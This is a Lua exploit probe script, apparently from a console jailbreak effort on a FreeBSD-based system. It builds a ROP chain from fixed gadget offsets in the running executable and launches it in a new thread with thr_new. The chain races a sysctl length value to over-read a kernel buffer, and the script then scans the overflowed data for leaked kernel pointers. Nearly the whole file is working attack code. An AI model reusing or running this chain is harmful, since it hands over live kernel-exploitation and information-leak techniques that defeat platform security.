-- CRASH_CLASS: LOW
-- PROBE 393e: diagnose which ROP chain build step corrupts stdout
--
-- Minimal chain: sysarch + 5 flips + thr_exit. Print after EVERY step.

print("=== PROBE 393e: chain build debug ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local function w64(addr, lo, hi)
    wd(addr, lo or 0)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

print("step1: sigsys")
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
w64(N(act), 1, 0)
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)
print("step1: ok")

print("step2: eboot")
local info_buf = memory.alloc(0x200)
zero_buf(info_buf, 0x200)
wd(N(info_buf), 0x160)
pcall(function() mk(593)(uint64(0), info_buf) end)
local eb_lo = rd(N(info_buf) + 0x108) or 0
local eb_hi = rd(N(info_buf) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

print("step3: fn_addr")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_val = tonumber(fn_str)
local fn_lo = fn_val % 0x100000000
local fn_hi = math.floor(fn_val / 0x100000000)
print(string.format("fn=%X_%08X", fn_hi, fn_lo))

print("step4: alloc stack")
local STACK_SIZE = 0x4000
local stack = memory.alloc(STACK_SIZE)
print("step4a: zero stack")
zero_buf(stack, STACK_SIZE)
local stack_base = N(stack)
local entry_rsp = ((stack_base + STACK_SIZE) - ((stack_base + STACK_SIZE) % 16)) - 8
print(string.format("rsp=%X", entry_rsp))

print("step5: alloc tcb")
local fake_tcb = memory.alloc(0x1000)
print("step5a: zero tcb")
zero_buf(fake_tcb, 0x1000)
print("step5b: tcb addr")
local tcb_addr = N(fake_tcb)
local tcb_lo = tcb_addr % 0x100000000
local tcb_hi = math.floor(tcb_addr / 0x100000000)
print(string.format("tcb=%X_%08X", tcb_hi, tcb_lo))

print("step5c: write self-ref")
w64(tcb_addr, tcb_lo, tcb_hi)
print("step5c: ok")

print("step5d: tcb ptr buf")
local tcb_ptr_buf = memory.alloc(8)
local tpb = N(tcb_ptr_buf)
w64(tpb, tcb_lo, tcb_hi)
print("step5d: ok")

print("step6: gadgets")
local function gadd(offset)
    local lo = eb_lo + offset
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- Test one gadget calc
local tlo, thi = gadd(0x992)
print(string.format("pop_rax=%X_%08X", thi, tlo))

print("step7: build chain")
local sp = entry_rsp
local written = 0

local function push(lo, hi)
    w64(sp, lo or 0, hi or 0)
    sp = sp + 8
    written = written + 1
end

local function push_g(offset)
    local lo, hi = gadd(offset)
    push(lo, hi)
end

-- sysarch(165, 129, &tcb_ptr_buf)
push(165, 0)               -- RAX = sysarch
push_g(0xC9DFE)            -- pop_rdi_ret
push(129, 0)               -- RDI = SET_FSBASE
push_g(0xD77D)             -- pop_rsi_ret
push(tpb % 0x100000000, math.floor(tpb / 0x100000000))
push_g(0x3B02D7)           -- pop_rdx_ret
push(0, 0)
push_g(0xE64)              -- pop_rcx_ret
push(0, 0)
push(fn_lo, fn_hi)         -- fn_addr (syscall stub)
print(string.format("step7a: sysarch chain done, %d qwords", written))

-- Shared oldlenp
local shared = memory.alloc(0x40)
zero_buf(shared, 0x40)
local olp = N(shared)

-- 5 flip iterations
for i = 1, 5 do
    push_g(0xC9DFE)     -- pop_rdi
    push(olp, 0)        -- &oldlenp
    push_g(0x992)        -- pop_rax
    push(0x2000, 0)      -- large
    push_g(0x92C67)      -- mov [rdi],rax;ret

    push_g(0xC9DFE)
    push(olp, 0)
    push_g(0x992)
    push(0x448, 0)       -- small
    push_g(0x92C67)
end
print(string.format("step7b: flips done, %d qwords", written))

-- Signal done: write 0 to flag
local flag = olp + 0x10
push_g(0xC9DFE)
push(flag, 0)
push_g(0x992)
push(0, 0)
push_g(0x92C67)

-- thr_exit(431)
push_g(0x992)         -- pop_rax
push(431, 0)          -- 431
push_g(0xC9DFE)       -- pop_rdi
push(0, 0)
push(fn_lo, fn_hi)    -- fn_addr
print(string.format("step7c: full chain, %d qwords, %d bytes", written, written * 8))

-- Verify chain readback
local v0 = rd(entry_rsp) or 0
local v1 = rd(entry_rsp + 4) or 0
print(string.format("chain[0]=%08X_%08X (expect 165)", v1, v0))

print("step8: thr_param")
local param = memory.alloc(0x38)
zero_buf(param, 0x38)
local sf_lo, sf_hi = gadd(0x992)  -- pop_rax_ret as start_func
w64(N(param), sf_lo, sf_hi)
w64(N(param) + 8, 0, 0)
w64(N(param) + 0x10, stack_base % 0x100000000, math.floor(stack_base / 0x100000000))
w64(N(param) + 0x18, STACK_SIZE, 0)
local ctid = memory.alloc(8)
zero_buf(ctid, 8)
w64(N(param) + 0x30, N(ctid) % 0x100000000, math.floor(N(ctid) / 0x100000000))
print("step8: ok")

print("step9: thr_new")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(param)), uint64(0x38))
end)
print(string.format("thr_new=%d", ok_t and N(rv_t) or -999))

if (ok_t and N(rv_t) or -1) ~= 0 then
    print("FAIL")
    return
end

print("step10: race")
wd(olp, 0x448)
wd(flag, 1)

local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)
local outbuf = memory.alloc(0x2000)
local sc = mk(202)

local over_n = 0
local kptr_n = 0
for r = 1, 100 do
    if N(native.fcall_with_rax(stub, 20)) ~= pid_val then break end
    for i = 0, 0x1FFC, 4 do wd(N(outbuf) + i, 0xDEADDEAD) end
    wd(olp, 0x448)

    local ok_s, rv_s = pcall(function()
        return sc(uint64(N(mib)), uint64(4), outbuf,
            uint64(olp), uint64(0), uint64(0))
    end)
    if ok_s and N(rv_s) == 0 then
        local past = false
        for off = 0x448, 0x460, 4 do
            local d = rd(N(outbuf) + off)
            if d and d ~= 0xDEADDEAD then past = true; break end
        end
        if past then
            over_n = over_n + 1
            for off = 0x448, 0x1FF0, 8 do
                local lo = rd(N(outbuf) + off)
                local hi = rd(N(outbuf) + off + 4)
                if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    kptr_n = kptr_n + 1
                    if kptr_n <= 5 then
                        print(string.format("KPTR +%03X %08X_%08X", off, hi, lo))
                    end
                end
            end
        end
    end
end

print(string.format("over=%d kptr=%d child=%s",
    over_n, kptr_n, rd(flag) == 0 and "done" or "run"))
print("=== 393e COMPLETE ===")
